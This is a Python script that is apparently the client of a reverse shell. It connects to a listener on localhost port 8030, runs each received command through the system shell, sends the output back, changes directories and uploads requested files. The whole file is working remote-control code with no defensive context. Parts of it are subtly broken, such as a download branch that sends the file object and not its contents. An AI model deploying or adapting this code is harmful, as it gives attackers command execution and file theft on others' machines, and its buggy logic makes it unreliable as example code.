import socket
import subprocess
import os

size = 10 ** 10

payload = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
payload.connect(('localhost', 8030))
print('establish connect')


def send_data(output_data):
    size_of_data = len(output_data)
    size_of_data = str(size_of_data)
    payload.send(bytes(size_of_data, 'utf-8'))
    if not isinstance(output_data, bytes):
        output_data = bytes(output_data, 'utf-8')
    print(output_data)
    payload.send(output_data)


while True:
    cmd = payload.recv(size)
    cmd = cmd.decode('utf-8')
    if cmd == 'quit':
        print('quit')
        payload.close()
        break
    elif cmd[:2] == 'cd':
        try:
            os.chdir(cmd[3::])
        except FileExistsError:
            send_data('File not found')
        else:
            send_data('changed Directory')
        continue
    elif cmd[:8] == 'download':
        try:
            with open(f'{cmd[9::]}', 'rb') as data:
                data_read = data.read()
                data.close()
            send_data(data)
            continue
        except Exception:
            send_data(b'no data')
        else:
            send_data(data_read)
        continue

    try:
        output = subprocess.check_output(cmd, shell=True)
    except Exception:
        send_data(b'wrong command')
    else:
        send_data(output)
